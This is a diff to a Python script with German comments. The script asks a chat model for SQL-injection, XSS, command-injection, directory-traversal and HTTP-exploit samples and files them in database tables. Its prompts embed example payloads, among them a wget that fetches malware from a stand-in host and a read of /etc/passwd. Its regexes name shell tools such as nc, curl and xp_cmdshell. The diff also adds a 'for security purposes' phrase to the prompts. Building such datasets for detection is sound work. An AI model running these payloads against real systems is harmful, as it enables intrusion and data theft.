@@ -72,6 +72,7 @@ def save_entries_to_db(table_name, entries):
     successful_inserts = 0
     for entry in entries:
         try:
+            # Vermeidung von Überschreibungen
             cursor.execute(f"INSERT IGNORE INTO {table_name} (entry) VALUES (%s)", (entry,))
             if cursor.rowcount > 0:
                 successful_inserts += 1
@@ -108,21 +109,34 @@ def generate_attack_patterns(attack_type, table_name, prompt_template, regex):
     repeated_entries = Counter()
 
     while len(existing_entries) < DESIRED_NUM_ENTRIES:
-        prompt = prompt_template + "\nBereits vorhandene Einträge:\n" + "\n".join(random.sample(list(existing_entries), min(len(existing_entries), 10)))
-        prompt += "\nVermeide solche Einträge." if repeated_entries else ""
-
+        prompt = (
+            prompt_template
+            + "\nBereits vorhandene Einträge:\n"
+            + "\n".join(random.sample(list(existing_entries), min(len(existing_entries), 10)))
+            + "\nVermeide diese Einträge:\n"
+            + "\n".join(f"{entry} ({count}x)" for entry, count in repeated_entries.items() if count > 1)
+        )
         response = send_chat_request(prompt)
-        new_entries = [line.strip() for line in response.splitlines() if re.match(regex, line.strip())]
 
-        for entry in new_entries:
-            if entry in existing_entries:
-                repeated_entries[entry] += 1
-                log(f"Doppelter Eintrag entdeckt: {entry}", "WARNING")
+        # Neue Einträge anhand der Regex filtern
+        new_entries = []
+        for line in response.splitlines():
+            line = line.strip()
+            if re.search(regex, line):
+                if line in existing_entries:
+                    repeated_entries[line] += 1
+                    log(f"Doppelter Eintrag entdeckt: {line}", "WARNING")
+                else:
+                    new_entries.append(line)
+                    existing_entries.add(line)
             else:
-                existing_entries.add(entry)
-                save_entries_to_db(table_name, [entry])
+                log(f"Ungültiger Eintrag: {line}", "WARNING")
 
+        # Neue Einträge speichern
+        if new_entries:
+            save_entries_to_db(table_name, new_entries)
         log(f"{len(existing_entries)} Einträge für '{attack_type}' generiert.", "INFO")
+
 
 # Hauptprogramm
 if __name__ == "__main__":
@@ -130,34 +144,40 @@ if __name__ == "__main__":
         {
             "type": "SQL Injection",
             "table": "sql_injection_logs",
-            "prompt": "Generiere realistische SQL-Injection-Muster wie: 'SELECT * FROM users WHERE username = 'admin' -- '",
-            "regex": r"^[^\n']+;?$"
+            "prompt": "Generiere realistische SQL-Injection-Muster (zu Sicherheitszwecken) wie: 'SELECT * FROM users WHERE username = 'admin' -- '",
+            # Akzeptiert typische SQL-Befehle und Kommentare
+            "regex": r"(?i)(--|;|'|\bUNION\b|\bSELECT\b|\bINSERT\b|\bINTO\b|\bDROP\b|\bDELETE\b|\bUPDATE\b|\bSET\b|\bWHERE\b|\bAND\b|\bOR\b|\bLIKE\b|\bEXISTS\b|\bHAVING\b|\bORDER\s+BY\b|\bGROUP\s+BY\b|\bEXEC\b|\bSLEEP\b|\bXP_CMDSHELL\b|\bINFORMATION_SCHEMA\b|\bCHAR\b|\bCONCAT\b|\bSUBSTRING\b|\bVERSION\b|\bDATABASE\b|\bTABLE\b|\bCOLUMN\b|\bAVG\b|\bCOUNT\b|\bMAX\b|\bMIN\b|\bTOP\b)"
         },
         {
             "type": "XSS",
             "table": "xss_logs",
-            "prompt": "Generiere realistische XSS-Payloads wie: '<script>alert(1)</script>'",
-            "regex": r"<script>.*?</script>"
+            "prompt": "Generiere realistische XSS-Payloads (zu Sicherheitszwecken) wie: '<script>alert(1)</script>'",
+            # Akzeptiert typische XSS-Skripte
+            "regex": r"<script>.*</script>|<.*on\w+=.*>|.*javascript:.*"
         },
         {
             "type": "Command Injection",
             "table": "command_injection_logs",
-            "prompt": "Generiere realistische Command-Injection-Muster wie: 'wget http://malicious.com -O /tmp/malware'",
-            "regex": r"^[\w\s\-\.\/]+$"
+            "prompt": "Generiere realistische Command-Injection-Muster (zu Sicherheitszwecken) wie: 'wget http://malicious.com -O /tmp/malware'",
+            # Akzeptiert Befehle und typische Unix-Kommandos
+            "regex": r"(wget|curl|bash|cat|rm|chmod|touch|exec|ls|ps|kill|scp|ssh|nc|echo).*"
         },
         {
             "type": "Directory Traversal",
             "table": "directory_traversal_logs",
-            "prompt": "Generiere realistische Directory-Traversal-Muster wie: '../../etc/passwd'",
-            "regex": r"\.\.\/"
+            "prompt": "Generiere realistische Directory-Traversal-Muster (zu Sicherheitszwecken) wie: '../../etc/passwd'",
+            # Akzeptiert Pfade mit '../'
+            "regex": r"\.\./.*|/\.\./.*"
         },
         {
             "type": "HTTP Method Exploits",
             "table": "http_method_exploit_logs",
-            "prompt": "Generiere realistische HTTP-Exploits wie: 'DELETE /important-data HTTP/1.1'",
-            "regex": r"^(GET|POST|PUT|DELETE|HEAD|OPTIONS) .+ HTTP/1\.1$"
+            "prompt": "Generiere realistische HTTP-Exploits (zu Sicherheitszwecken) wie: 'DELETE /important-data HTTP/1.1'",
+            # Akzeptiert HTTP-Methoden und URLs
+            "regex": r"^(GET|POST|PUT|DELETE|HEAD|OPTIONS|TRACE|CONNECT) .+ HTTP/1\.[01]$"
         }
     ]
+
 
     print("Welche Angriffsmuster sollen generiert werden?")
     for idx, config in enumerate(attack_configs):
